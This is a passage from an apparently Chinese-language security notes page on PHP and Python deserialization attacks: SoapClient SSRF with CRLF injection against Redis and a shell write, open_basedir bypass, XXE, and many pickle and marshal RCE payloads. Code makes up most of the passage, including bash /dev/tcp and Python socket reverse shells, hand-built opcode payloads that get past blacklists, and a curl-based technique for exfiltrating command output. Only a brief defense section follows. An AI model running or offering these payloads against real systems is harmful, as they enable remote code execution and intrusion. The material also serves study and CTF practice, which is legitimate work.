<pre><code>Error: payload in /usercode/file.php:2
Stack trace:
#0 &#123;main&#125;

Error: payload in /usercode/file.php:2
Stack trace:
#0 &#123;main&#125;
</code></pre>
<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
<p><code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7</p>
<h5 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h5><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
<p>该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<pre><code>public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
</code></pre>
<ul>
<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
</ul>
<p>在官方文档中可以看到，它的user_agent 参数是可以控制 HTTP头部的 User-Agent 的。而在HTTP 协议中，header 与body 是用两个 <code>\r\n</code>分隔的，浏览器也是通过这两个 \r\n来区分 header 和body 的。</p>
<h6 id="使用-SoapClient-类进行-SSRF"><a href="#使用-SoapClient-类进行-SSRF" class="headerlink" title="使用 SoapClient 类进行 SSRF"></a>使用 SoapClient 类进行 SSRF</h6><p>payload:</p>
<pre><code class="php">&lt;?php
$a = new SoapClient(null,array(&#39;location&#39;=&gt;&#39;http://47.xxx.xxx.72:2333/aaa&#39;, &#39;uri&#39;=&gt;&#39;http://47.xxx.xxx.72:2333&#39;));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?&gt;
</code></pre>
<p>但是，由于它仅限于HTTP&#x2F;HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p>
<p>攻击redis：</p>
<pre><code>&lt;?php
$target = &#39;http://47.xxx.xxx.72:6379/&#39;;
$poc = &quot;CONFIG SET dir /var/www/html&quot;;
$a = new SoapClient(null,array(&#39;location&#39; =&gt; $target, &#39;uri&#39; =&gt; &#39;hello^^&#39;.$poc.&#39;^^hello&#39;));
$b = serialize($a);
$b = str_replace(&#39;^^&#39;,&quot;\n\r&quot;,$b); 
echo $b;
$c = unserialize($b);
$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?&gt;
</code></pre>
<p>对于如何发送POST的数据包，这里面还有一个坑，就是 <code>Content-Type</code> 的设置，因为我们要提交的是POST数据 <code>Content-Type</code> 的值我们要设置为 <code>application/x-www-form-urlencoded</code>，这里如何修改 <code>Content-Type</code> 的值呢？由于 <code>Content-Type</code> 在 <code>User-Agent</code> 的下面，所以我们可以通过 <code>SoapClient</code> 来设置 <code>User-Agent</code> ，将原来的 <code>Content-Type</code> 挤下去，从而再插入一个新的 <code>Content-Type</code> 。</p>
<p>eg;</p>
<pre><code>&lt;?php
$target= &#39;http://127.0.0.1/test.php&#39;;
$post_string= &#39;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#39;;
$headers= array(
   &#39;X-Forwarded-For:127.0.0.1&#39;,
   &#39;Cookie:admin=1&#39;
   );
$b= new SoapClient(null,array(&#39;location&#39;=&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type:application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length:&#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;=&gt;&quot;peri0d&quot;));

$aaa= serialize($b);
$aaa= str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa);
$aaa= str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa);
echo $aaa;

$x= unserialize(urldecode($aaa));
$x-&gt;no_func();
</code></pre>
<p>test.php</p>
<pre><code>&lt;?php 
if($_SERVER[&#39;REMOTE_ADDR&#39;]==&#39;127.0.0.1&#39;)&#123;
    echo &#39;hi&#39;;
    @$a=$_POST[1];
    @eval($a);
&#125;
?&gt;
</code></pre>
<p>这样就可以成功写入<code>shell.php</code>。</p>
<h5 id="DirectoryIterator-类"><a href="#DirectoryIterator-类" class="headerlink" title="DirectoryIterator 类"></a>DirectoryIterator 类</h5><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。</p>
<p>DirectoryIterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。</p>
<p>eg:</p>
<pre><code>// test.php
&lt;?php
$dir = $_GET[&#39;whoami&#39;];
$a = new DirectoryIterator($dir);
foreach($a as $f)&#123;
    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
&#125;
?&gt;

# payload一句话的形式:
$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;
</code></pre>
<p>输入 <code>/?whoami=glob:///*</code> 即可列出根目录下的文件</p>
<p>只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p>
<h5 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h5><p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
<p>官方文档中对于SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220331135510801.png" alt="image-20220331135510801"></p>
<p>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
<p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269434.htm">https://bbs.pediy.com/thread-269434.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/01/01/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#Demo1%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">https://www.mi1k7ea.com/2019/01/01/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#Demo1%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6699#toc-0">https://xz.aliyun.com/t/6699#toc-0</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2958#toc-0">https://xz.aliyun.com/t/2958#toc-0</a></p>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>Python 中有很多能进行序列化的模块，比如 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/gcgc/p/10973418.html">Json、pickle&#x2F;cPickle、Shelve</a>、<a target="_blank" rel="noopener" href="https://docs.python.org/zh-tw/3/library/marshal.html">Marshal</a></p>
<p>一般 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a> 模块较常使用</p>
<h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><p>在 pickle 模块中 , 常用以下四个方法</p>
<ul>
<li><code>pickle.dump(obj, file)</code> : 将对象序列化后保存到文件</li>
<li><code>pickle.load(file)</code> : 读取文件， 将文件中的序列化内容反序列化为对象</li>
<li><code>pickle.dumps(obj)</code> : 将对象序列化成字符串格式的字节流</li>
<li><code>pickle.loads(bytes_obj)</code> : 将字符串格式的字节流反序列化为对象<br>注意：file文件需要以 2 进制方式打开，如 <code>wb</code>、<code>rb</code></li>
</ul>
<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。</p>
<p>简单说明一下<code>__reduce__()</code>函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果</p>
<h5 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h5><p><strong>1.通常在解析认证token，session的时候</strong></p>
<p>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。</p>
<p><strong>2.可能将对象Pickle后存储成磁盘文件。</strong></p>
<p><strong>3.可能将对象Pickle后在网络中传输。</strong></p>
<p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的。</p>
<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><h6 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h6><p>eg：</p>
<pre><code>import pickle
import os
class A(object):
    def __reduce__(self):
        a = &#39;/bin/sh&#39;
        return (os.system,(a,))
a = A()
test = pickle.dumps(a)
pickle.loads(test)
</code></pre>
<p>执行反序列化后，os.system(‘&#x2F;bin&#x2F;sh’,)启动，并等待输入流输入命令，实现弹shell</p>
<p>小结：</p>
<p>代码执行&#x2F;命令执行可用函数</p>
<pre><code class="python">eval, execfile, compile, open, file, map, input,
os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,
os.listdir, os.access,
os.execl, os.execle, os.execlp, os.execlpe, os.execv,
os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,
os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,
pickle.load, pickle.loads,cPickle.load,cPickle.loads,
subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,
commands.getstatusoutput,commands.getoutput,commands.getstatus,
glob.glob,
linecache.getline,
shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,
dircache.listdir,dircache.opendir,
io.open,
popen2.popen2,popen2.popen3,popen2.popen4,
timeit.timeit,timeit.repeat,
sys.call_tracing,
code.interact,code.compile_command,codeop.compile_command,
pty.spawn,
posixfile.open,posixfile.fileopen,
platform.popen
</code></pre>
<p>几个不常用的payload：</p>
<pre><code class="python">map(__import__(&#39;os&#39;).system,[&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,])

sys.call_tracing(__import__(&#39;os&#39;).system,(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,))

platform.popen(&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)
</code></pre>
<h6 id="从input到shell"><a href="#从input到shell" class="headerlink" title="从input到shell"></a>从input到shell</h6><p>input函数在python2中是能够执行python代码的</p>
<p>几个序列化符号：</p>
<pre><code>c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。
(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。
t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。
S：读取引号中的字符串直到换行符处，然后将它压入堆栈。
R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。
.：结束pickle。
</code></pre>
<p>input是从标准输入获取参数，所以我们需要修改其输入流</p>
<p>我们可以利用StringIO库，然后将标准输入修改为StringIO创建的内存缓冲区即可</p>
<p>通常我们这么改：</p>
<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220402134214610-16488781360851.png" alt="image-20220402134214610"></p>
<p>但在pickle的0号协议（我们序列化常用协议，比其它的相比更易阅读）不能用等号，所以使用setattr</p>
<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220402135239077.png" alt="image-20220402135239077"></p>
<p>构造</p>
<pre><code>c__builtin__
setattr
(c__builtin__
__import__
(S&#39;sys&#39;
tRS&#39;stdin&#39;
cStringIO
StringIO
(S&#39;__import__(&#39;os&#39;).system(\&#39;curl 127.0.0.1:12345\&#39;)&#39;
tRtRc__builtin__
input
(S&#39;input: &#39;
tR.
</code></pre>
<p>payload:</p>
<pre><code class="python">a=&#39;&#39;&#39;c__builtin__\nsetattr\n(c__builtin__\n__import__\n(S&#39;sys&#39;\ntRS&#39;stdin&#39;\ncStringIO\nStringIO\n(S&#39;__import__(&#39;os&#39;).system(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;)&#39;\ntRtRc__builtin__\ninput\n(S&#39;python&gt; &#39;\ntR.&#39;&#39;&#39;

pickle.loads(a)
</code></pre>
<h6 id="类函数构造"><a href="#类函数构造" class="headerlink" title="类函数构造"></a>类函数构造</h6><p>这里主要使用<code>new.classobj</code>函数来构造一个类函数对象然后执行，这样就可以调用原有库的一些函数，也可以自己构造。</p>
<pre><code class="python">payload=pickle.dumps(new.classobj(&#39;system&#39;, (), &amp;#123;&#39;__getinitargs__&#39;:lambda self,arg=(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;&amp;#125;)())
pickle.loads(payload)
</code></pre>
<h6 id="与SSTI的配合"><a href="#与SSTI的配合" class="headerlink" title="与SSTI的配合"></a>与SSTI的配合</h6><p>使用了flask框架</p>
<pre><code class="python">payload=&quot;cflask.templating\nrender_template_string\np0\n(S\&quot;&amp;#123;% for x in (().__class__.__base__.__subclasses__()) %&amp;#125;&amp;#123;%if x.__name__ ==&#39;catch_warnings&#39;%&amp;#125;&amp;#123;&amp;#123;x.__repr__.im_func.func_globals.linecache.os.system(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/12345 0&gt;&amp;1\&quot; &amp;&#39;)&amp;#125;&amp;#125;&amp;#123;%endif%&amp;#125;&amp;#123;%endfor%&amp;#125;\&quot;\np1\ntp2\nRp3\n.&quot;
</code></pre>
<p>pickle注入payload生成器：<a target="_blank" rel="noopener" href="https://github.com/sensepost/anapickle">https://github.com/sensepost/anapickle</a></p>
<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><h6 id="当reduce被过滤"><a href="#当reduce被过滤" class="headerlink" title="当reduce被过滤"></a>当reduce被过滤</h6><p>reduce方法底层实现的操作码是R，只需把操作码R过滤掉即可。这使用pickletools.genops即可实现</p>
<p>有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>
<pre><code>black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]
</code></pre>
<p>可惜<code>platform.popen()</code>不在名单里，它可以做到类似<code>system</code>的功能。</p>
<pre><code>import pickle, pickletools, platform

class exp():
    def __reduce__(self):
        s = r&quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.17.0.1&quot;,30006));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;&quot;&quot;&quot;
        return (platform.popen, (s,))
        #return  (map, (__import__(&#39;os&#39;).system(s)))

a = pickle.dumps(exp())
a = pickletools.optimize(a)
print(a)
b = pickle.loads(a)
print(b)
</code></pre>
<p>预期解</p>
<p>利用map</p>
<pre><code class="text">class Exploit(object):
    def __reduce__(self):
     return map,(os.system,[&quot;ls&quot;])
</code></pre>
<p>最稳妥的方式是禁止掉<code>R</code>这个指令码</p>
<p>彻底过滤了<code>R</code>指令码（写法是：只要见到payload里面有<code>R</code>这个字符，就直接驳回，简单粗暴）。现在的任务是：给出一个字符串，<strong>反序列化之后，name和grade需要与blue这个module里面的name、grade相对应</strong>。</p>
<p>使用c指令码获取全局变量的功能将name换成blue name</p>
<p>以name的为例，只需要把硬编码的<code>rxz</code>改成从<code>blue</code>引入的<code>name</code>，写成指令就是：<code>cblue\nname\n</code>。把用于编码<code>rxz</code>的<code>X\x03\x00\x00\x00rxz</code>替换成我们的这个global指令</p>
<p>顺带一提，由于pickle导出的字符串里面有很多的不可见字符，所以一般都经过base64编码之后传输。</p>
<h6 id="c指令module受限"><a href="#c指令module受限" class="headerlink" title="c指令module受限"></a>c指令module受限</h6><p><code>c</code>指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法， 然而<code>find_class</code>可以被出题人重写。如果出题人只允许<code>c</code>指令包含<code>__main__</code>这一个module，上述题又该如何解决呢？</p>
<p>通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>
<ul>
<li>通过<code>__main__.blue</code>引入这一个module，由于命名空间还在main内，故不会被拦截</li>
<li>把一个dict压进栈，内容是<code>&#123;&#39;name&#39;: &#39;rua&#39;, &#39;grade&#39;: &#39;www&#39;&#125;</code></li>
<li>执行BUILD指令，会导致改写 <code>__main__.blue.name</code>和 <code>__main__.blue.grade</code> ，至此<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li>
<li>弹掉栈顶，现在栈变成空的</li>
<li>照抄正常的Student序列化之后的字符串，压入一个正常的Student对象，name和grade分别是’rua’和’www’</li>
</ul>
<p>由于栈顶是正常的Student对象，pickle.loads将会正常返回。到手的Student对象，当然name和grade都与blue.name、blue.grade对应了——我们刚刚亲手把blue篡改掉</p>
<h6 id="利用b指令码实现rce"><a href="#利用b指令码实现rce" class="headerlink" title="利用b指令码实现rce"></a>利用b指令码实现rce</h6><p>b指令码，即build指令。</p>
<ul>
<li>把当前栈栈顶存进<code>state</code>，然后弹掉。</li>
<li>把当前栈栈顶记为<code>inst</code>，然后弹掉。</li>
<li>利用<code>state</code>这一系列的值来<strong>更新实例</strong><code>inst</code>。把得到的对象扔进当前栈。</li>
</ul>
<p>注意：如果<code>inst</code>拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__ </code>里面。</p>
<p>这里存在安全隐患：<code>Student</code>原先是没有<code>__setstate__</code>这个方法的。那么我们利用<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>来BUILE这个对象，那么现在对象的<code>__setstate__</code>就变成了<code>os.system</code>；接下来利用<code>&quot;ls /&quot;</code>来再次BUILD这个对象，则会执行<code>setstate(&quot;ls /&quot;)</code> ，而此时<code>__setstate__</code>已经被我们设置为<code>os.system</code>，因此实现了RCE.</p>
<p>payload：</p>
<pre><code>payload = b&#39;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&#39;
</code></pre>
<p>有一个可以改进的地方：这份payload由于没有返回一个Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常Student进栈。payload构造如下：</p>
<pre><code class="text">payload = b&#39;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#39;
</code></pre>
<h6 id="使用i指令码实现rce"><a href="#使用i指令码实现rce" class="headerlink" title="使用i指令码实现rce"></a>使用i指令码实现rce</h6><pre><code>def pop_mark(self):
    items = self.stack
    self.stack = self.metastack.pop()
    self.append = self.stack.append
    return items

def load_inst(self):
        module = self.readline()[:-1].decode(&quot;ascii&quot;)
        name = self.readline()[:-1].decode(&quot;ascii&quot;)
        klass = self.find_class(module, name)
        self._instantiate(klass, self.pop_mark())
    dispatch[INST[0]] = load_inst
</code></pre>
<p>首先通过<code>find_class</code>获得方法，然后通过<code>pop_mark</code>获得参数（弹出前序栈重新赋值给当前栈，而且获取当前栈上的内容），并调用<code>_instantiate</code>函数来执行，并将执行的结果存入栈中。</p>
<p>处理前payload：</p>
<pre><code>b&#39;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#39;
</code></pre>
<p>处理后payload：</p>
<p>将<code>\x80\x03c__main__\nB\n)</code>改成<code>\x80\x03c__main__\nA\n&#125;(Vls -laios\nsystem\n0c__main__\nB\n)</code></p>
<pre><code>b&#39;\x80\x03c__main__\nA\n&#125;(Vls -laios\nsystem\n0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#39;
</code></pre>
<h6 id="使用o指令码实现rce"><a href="#使用o指令码实现rce" class="headerlink" title="使用o指令码实现rce"></a>使用o指令码实现rce</h6><p>o指令码与i指令码作用基本相同</p>
<pre><code>def pop_mark(self):
    items = self.stack
    self.stack = self.metastack.pop()
    self.append = self.stack.append
    return items

def load_obj(self):
        # Stack is ... markobject classobject arg1 arg2 ...
        args = self.pop_mark()
        cls = args.pop(0)
        self._instantiate(cls, args)
    dispatch[OBJ[0]] = load_obj
</code></pre>
<p>修改前：</p>
<pre><code>b&#39;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#39;
</code></pre>
<p>修改后</p>
<pre><code>b&#39;\x80\x03c__main__\nA\n&#125;(cos\nsystem\nX\x06\x00\x00\x00ls -lao0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#39;
</code></pre>
<p><strong>一些细节</strong></p>
<p>一、其他模块的load也可以触发pickle反序列化漏洞。例如：numpy.load()先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此numpy.load()也可以触发pickle反序列化漏洞。</p>
<p>二、即使代码中没有import os，GLOBAL指令也可以自动导入os.system。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p>
<p>三、即使没有回显，也可以很方便地调试恶意代码。只需要拥有一台公网服务器，执行os.system(‘curl your_server&#x2F;<code>ls / | base64</code>)，然后查询您自己的服务器日志，就能看到结果。这是因为：以&#96;引号包含的代码，在sh中会直接执行，返回其结果。</p>
<p>从0开始：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p>
<p>手敲opcode：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p>
<p>​					<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188981%E6%89%BE%E5%88%B0">https://www.anquanke.com/post/id/188981%E6%89%BE%E5%88%B0</a></p>
<p><a target="_blank" rel="noopener" href="https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#title-16">https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#title-16</a></p>
<h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><p>官方推荐定制<code>Unpickler.find_class()</code>函数来限制模块和其中的类，但即便必须在<code>builtins</code>模块下执行也能够找到不少类似于沙箱逃逸的办法来完成攻击，甚至直接编写<code>pickle</code>代码</p>
<p>(1) 不要再不守信任的通道中传递 pcikle 序列化对象<br>(2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播<br>(3) 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据<br>(4) 将 pickle 加载的数据列入白名单</p>
<h4 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a>marshal</h4><p>由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p>
<h5 id="实现任意函数构造"><a href="#实现任意函数构造" class="headerlink" title="实现任意函数构造"></a>实现任意函数构造</h5><p>types.FunctionType配上marshal.loads</p>
<pre><code class="python">import base64
import marshal

def foo():
    import os
    os.system(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;)

payload=&quot;&quot;&quot;ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S&#39;%s&#39;
tRtRc__builtin__
globals
(tRS&#39;&#39;
tR(tR.&quot;&quot;&quot;%base64.b64encode(marshal.dumps(foo.func_code))

pickle.loads(payload)

payload=&quot;&quot;&quot;ctypes
FunctionType
(cmarshal
loads
(S&#39;%s&#39;
tRc__builtin__
globals
(tRS&#39;&#39;
tR(tR.&quot;&quot;&quot;%marshal.dumps(foo.func_code).encode(&#39;string-escape&#39;)

pickle.loads(payload)
</code></pre>
<p>new.function配上marshal.loads</p>
<pre><code class="python">import base64
import marshal

def foo():
    import os
    os.system(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;)

payload=&quot;&quot;&quot;cnew
function
(cmarshal
loads
(cbase64
b64decode
(S&#39;%s&#39;
tRtRc__builtin__
globals
(tRS&#39;&#39;
tR(tR.&quot;&quot;&quot;%base64.b64encode(marshal.dumps(foo.func_code))

pickle.loads(payload)

payload=&quot;&quot;&quot;cnew
function
(cmarshal
loads
(S&#39;%s&#39;
tRc__builtin__
globals
(tRS&#39;&#39;
tR(tR.&quot;&quot;&quot;%marshal.dumps(foo.func_code).encode(&#39;string-escape&#39;)

pickle.loads(payload)
</code></pre>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25981037">https://zhuanlan.zhihu.com/p/25981037</a></p>
